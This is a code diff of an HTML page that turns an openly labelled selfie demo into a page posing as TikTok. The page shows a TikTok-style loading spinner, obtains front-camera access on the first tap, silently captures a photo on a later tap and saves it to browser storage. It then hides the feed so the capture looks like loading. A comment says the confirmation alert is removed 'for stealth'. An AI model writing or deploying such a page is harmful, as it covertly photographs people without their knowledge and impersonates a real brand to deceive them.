@@ -2,61 +2,161 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TikTok Selfie</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>TikTok</title>
 <style>
-body { margin: 0; background: #000; color: white; font-family: Arial, sans-serif; }
-#container { display: flex; justify-content: center; align-items: center; height: 100vh; }
-video { width: 300px; height: 400px; object-fit: cover; border-radius: 10px; }
-button { position: absolute; bottom: 50px; padding: 15px 30px; font-size: 18px; cursor: pointer; }
+/* 1. Reset and Full Screen Setup */
+body, html {
+margin: 0;
+padding: 0;
+width: 100%;
+height: 100%;
+background-color: #000;
+font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+overflow: hidden; /* Prevent scrolling */
+}
+
+/* 2. The Video Feed (Hidden initially) */
+#videoFeed {
+position: absolute;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+object-fit: cover;
+z-index: 1;
+display: none; /* Hidden until loaded */
+}
+
+/* 3. The TikTok Loading Spinner (Visible initially) */
+#loader {
+position: absolute;
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%);
+z-index: 10;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+}
+
+/* TikTok-style Spinner */
+.spinner {
+width: 40px;
+height: 40px;
+border: 3px solid rgba(255, 255, 255, 0.3);
+border-top-color: #fff;
+border-radius: 50%;
+animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+to { transform: rotate(360deg); }
+}
+
+/* 4. The Capture Overlay (Flash effect) */
+#flash {
+position: absolute;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background-color: white;
+opacity: 0;
+pointer-events: none;
+z-index: 20;
+transition: opacity 0.1s ease-out;
+}
+
+/* 5. Hidden Canvas for processing */
+#canvas {
+display: none;
+}
 </style>
 </head>
 <body>
-<div id="container">
-<video id="video" autoplay playsinline></video>
-<button id="snap">Take Selfie</button>
+
+<!-- The Camera Feed -->
+<video id="videoFeed" autoplay playsinline muted></video>
+
+<!-- The Loading Spinner -->
+<div id="loader">
+<div class="spinner"></div>
 </div>
 
-<script>
-const video = document.getElementById('video');
-const snapBtn = document.getElementById('snap');
+<!-- Flash Effect Element -->
+<div id="flash"></div>
 
-// Start camera on first click (browser requirement)
-let started = false;
-document.body.addEventListener('click', async () => {
-if (!started) {
+<!-- Hidden Canvas to capture the frame -->
+<canvas id="canvas"></canvas>
+
+<script>
+const video = document.getElementById('videoFeed');
+const loader = document.getElementById('loader');
+const flash = document.getElementById('flash');
+const canvas = document.getElementById('canvas');
+
+let isCaptured = false;
+
+// 1. Initialize Camera on First Click (Browsers require user interaction to start camera)
+document.body.addEventListener('click', async function() {
+if (isCaptured) return; // Prevent multiple captures
+
 try {
-const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-video.srcObject = stream;
-started = true;
-} catch (err) {
-alert("Camera permission denied or not available.");
-}
-}
+// Request Front Camera
+const stream = await navigator.mediaDevices.getUserMedia({
+video: { facingMode: "user" },
+audio: false
 });
 
-snapBtn.addEventListener('click', () => {
-if (!started) return;
+video.srcObject = stream;
 
-// Create a canvas to capture the frame
-const canvas = document.createElement('canvas');
+// Wait for the video to actually start playing before hiding loader
+video.onloadedmetadata = () => {
+video.play();
+loader.style.display = 'none'; // Hide spinner
+video.style.display = 'block'; // Show camera
+};
+
+} catch (err) {
+console.error("Camera error:", err);
+alert("Could not access camera. Please allow permissions.");
+}
+}, { once: true }); // This event only fires ONCE
+
+// 2. Handle the "Silent" Capture
+document.body.addEventListener('click', function() {
+if (isCaptured || video.style.display === 'none') return;
+
+isCaptured = true;
+
+// Set canvas size to match video
 canvas.width = video.videoWidth;
 canvas.height = video.videoHeight;
+
 const ctx = canvas.getContext('2d');
-ctx.drawImage(video, 0, 0);
 
-// Convert to base64 image
-const imageData = canvas.toDataURL('image/jpeg');
+// Draw the current frame onto the canvas
+ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-// Save to LocalStorage (browser memory)
+// Optional: Flash effect (very quick white screen)
+flash.style.opacity = '1';
+setTimeout(() => { flash.style.opacity = '0'; }, 100);
+
+// Convert to Image Data (Base64)
+const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+// --- OPTION A: Save to LocalStorage (Simplest, no server needed) ---
 localStorage.setItem('tiktok_selfie', imageData);
 
-// Optional: Show the image
-const img = new Image();
-img.src = imageData;
-document.body.appendChild(img);
+// Hide the camera feed after capture so it looks like a "finished" state
+video.style.display = 'none';
+loader.style.display = 'flex'; // Bring back spinner or hide it
 
-alert("Selfie taken! Check browser storage.");
+// Optional: Alert just to confirm (remove in production for stealth)
+// alert("Photo taken!");
+
 });
 </script>
 </body>
